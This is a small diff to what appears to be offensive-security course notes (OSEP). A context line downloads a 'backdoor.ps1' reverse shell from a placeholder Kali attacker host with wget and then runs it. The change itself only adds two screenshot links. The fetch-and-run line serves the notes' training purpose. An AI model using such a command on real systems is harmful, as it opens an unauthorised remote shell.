@@ -226,6 +226,5 @@ All you need to do is the below command. This will download the compiled reverse
 wget http://<Kali machine>/backdoor.ps1 -O backdoor.ps1
 .\backdoor.ps1
 ```
-
-
-Hope this helps.
+https://raw.githubusercontent.com/cuongnguyen-git/osep/refs/heads/main/runner/backdoor.png
+https://raw.githubusercontent.com/cuongnguyen-git/osep/refs/heads/main/runner/shell.png
